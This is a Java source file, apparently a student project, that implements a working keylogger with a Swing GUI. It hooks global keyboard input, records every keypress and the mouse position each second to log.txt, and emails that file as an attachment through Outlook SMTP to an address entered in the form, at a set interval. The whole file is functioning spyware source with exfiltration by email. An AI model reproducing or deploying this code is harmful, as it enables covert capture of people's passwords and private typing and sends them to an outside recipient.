//Cengizhan Özyurt 22120205041
//Enes Fatih Çelik 22120205377
//Muhammed Mesrur Kırbaş 22120205046

import javax.swing.*;
import java.io.IOException;
import java.awt.MouseInfo;
import java.io.FileWriter;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.Timer;
import java.util.TimerTask;
import java.util.logging.Level;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import javax.mail.*;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;
import java.io.File;
import java.util.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
//DİPNOT: KLAVYE VE HER İKİSİ SEÇİLDİĞİNDE DOSYAYI SONRADAN KAYDETTİĞİ İÇİN HATA MESAJI VERMEKTE ANCAK KOD SIKINTISIZ ÇALIŞMAKTA VE MAİL GÖNDERMEKTEDİR.

//Klavye ve mouse girdilerini kaydedip log.txt dosyasına kaydeden class.
class key_mouselogger extends Main implements NativeKeyListener {
    static int sayac = 0;
    static Timer myTimer = new Timer();
    static TimerTask gorev1;
    private static final Path file = Paths.get("log.txt");
    private static final Logger logger = LoggerFactory.getLogger(Main.class);

    //Klavye girdilerini kaydedip log.txt dosyasına kaydeden method burada tanımlanmıştır.
    public  void loggs() {

        logger.info("Keylogger başlatıldı!");

        init();

        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            logger.error(e.getMessage(), e);
            System.exit(-1);
        }

        GlobalScreen.addNativeKeyListener(new key_mouselogger());

    }

    private static void init() {


        java.util.logging.Logger logger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.WARNING);
        logger.setUseParentHandlers(false);
    }

    public void nativeKeyPressed(NativeKeyEvent e) {
        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());

        try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE,
                StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) {

            if (keyText.length() > 1) {
                writer.println("Basılan tuş"+"[" + keyText + "]\n");
            } else {
                writer.println("Basılan tuş"+keyText+"\n");
            }

        } catch (IOException ex) {
            logger.error(ex.getMessage(), ex);
            System.exit(-1);
        }
    }

    public void nativeKeyReleased(NativeKeyEvent e) {

    }

    public void nativeKeyTyped(NativeKeyEvent e) {

    }
    //**************************************************************************************
    //Mouse girdilerini kaydedidip log.txt dosyasına kaydeden method burada tanımlanmıştır.
    double  mouseX= 1.0;
    double  mouseY= 1.0;


    public void mouselog() {


        gorev1 = new TimerTask() {
            public void run() {

                mouseX = MouseInfo.getPointerInfo().getLocation().getX();
                mouseY = MouseInfo.getPointerInfo().getLocation().getY();


                try {
                    FileWriter myWriter = new FileWriter("log.txt", true);
                    myWriter.write("mouseX:" + mouseX + "\tmouseY:" + mouseY + "\n");
                    myWriter.close();

                } catch (IOException e) {
                    System.out.println("Bir hata oluştu.");
                    e.printStackTrace();
                }


                sayac++;

                if (sayac == 0) myTimer.cancel();
            }
        };
        myTimer.schedule(gorev1, 0, 1000);



    }
}
//Form yani GUİ'nin tanımlandığı ve arayüzün oluşturulduğu class.
 class Form extends JFrame {
    mail nesne = new mail();
    key_mouselogger nesne1 = new key_mouselogger();
    private JTextField textField1;
    private JTextField textField2;
    private JRadioButton sadeceFareRadioButton;
    private JRadioButton sadeceKlavyeRadioButton;
    private JRadioButton herIkisiRadioButton;
    private JButton durdurButton;
    private JButton başlatButton;
    private JPanel forms;
    public Form(){

        add(forms);
        setSize(800,400);
        setTitle("Keylogger Form");
        //Başlat butonuyla birlikte ve 3 adet radiobutton ile verilen senaryoya göre çıktı oluşturan method.
        başlatButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {

                if(sadeceFareRadioButton.isSelected()){
                    int time = Integer.parseInt(textField1.getText());
                    String formmail = textField2.getText();
                    nesne1.mouselog();
                    nesne.timer(time*60000,formmail);
                //timer methodundaki değer ms cinsinden olduğundan dolayı dakikaya çevirmek için 60000 ile çarpılmıştır.
                }
                else if(sadeceKlavyeRadioButton.isSelected()){
                    int time = Integer.parseInt(textField1.getText());
                    String formmail = textField2.getText();
                    nesne1.loggs();
                    nesne.timer(time*60000,formmail);
                //timer methodundaki değer ms cinsinden olduğundan dolayı dakikaya çevirmek için 60000 ile çarpılmıştır.
                }
                else if (herIkisiRadioButton.isSelected()) {
                    int time = Integer.parseInt(textField1.getText());
                    String formmail = textField2.getText();
                    nesne1.mouselog();
                    nesne1.loggs();
                    nesne.timer(time*60000,formmail);
                    //timer methodundaki değer ms cinsinden olduğundan dolayı dakikaya çevirmek için 60000 ile çarpılmıştır.
                }

            }

        });
        //durdur butonu ile programdaki aksiyon kesilmiştir.
        durdurButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                System.exit(0);

            }


        });
    }
}
class mail extends Main{

    //****************************
    //PROGRAMI ÇALIŞTIRMADAN ÖNCE MAİL CLASSINDA BULUNAN GÖNDERCİ MAİL(OUTLOOK) VE ŞİFRE BÖLÜMLERİNİ DOLDURUNUZ.
    //****************************



    //Mail zaman ayarlı olarak göndermek için Timer methodu tanımlandı.
    static int sayac = 0;
    static Timer myTimer = new Timer();
    static TimerTask gorev1;
    public  void timer(int a,String receiver) {

        gorev1 = new TimerTask() {
            public void run() {
                try {
                    send(receiver);
                } catch (MessagingException e) {
                    throw new RuntimeException(e);
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }

                sayac++;

                if(sayac==0) myTimer.cancel();
            }
        };
        myTimer.schedule(gorev1,0,a);

        //a değeri formda girişi yapılan değerdir ve kaç dakika arayla mail gönderileceğini belirtir.
        Form nesne = new Form();

    }


    public void send(String receiver) throws MessagingException, IOException {
        String baslik = "deneme1";
        String mesaj = "bu bir deneme mailidir.";
        String host = "smtp.outlook.com";
        String port = "587";

        final String senderEmail = "GÖNDERİCİ MAİL";
        final String senderPassword = "GÖNDERİCİ ŞİFRE";

        Properties props = new Properties();
        props.put("mail.smtp.auth", "true");
        props.put("mail.smtp.starttls.enable", "true");
        props.put("mail.smtp.host", host);
        props.put("mail.smtp.port", port);
        props.put("mail.debug", "true");
        props.setProperty("mail.smtp.ssl.protocols", "TLSv1.2");

        Authenticator auth = new Authenticator() {
            protected PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication(senderEmail, senderPassword);
            }
        };
        Session session = Session.getInstance(props, auth);

        try {

            MimeMessage msg = new MimeMessage(session);
            msg.setFrom(new InternetAddress(senderEmail));
            msg.addRecipient(Message.RecipientType.TO, new InternetAddress(receiver));
            MimeBodyPart textBodyPart = new MimeBodyPart();
            textBodyPart.setText("log dosyası ektedir.");
            Multipart multipart = new MimeMultipart();
            multipart.addBodyPart(textBodyPart);

            File logfile = new File("log.txt");
            MimeBodyPart attachmentBodyPart = new MimeBodyPart();
            attachmentBodyPart.attachFile(logfile);

            multipart.addBodyPart(attachmentBodyPart);
            msg.setContent(multipart);
            Transport.send(msg);

            msg.setSubject(baslik);

            msg.setText(mesaj);


        } catch (MessagingException ex) {
            System.out.println("Mesaj gönderilirken hata olustu: " + ex.getMessage());
        }
        {



        }
    }
}
public class Main  {
    private static Object receiver;

    public static void main(String[] args) throws IOException {
        JFrame form = new JFrame();
        Form Objform = new Form();
        Objform.setVisible(true);

    }

}
//Cengizhan Özyurt 22120205041
//Enes Fatih Çelik 22120205377
//Muhammed Mesrur Kırbaş 22120205046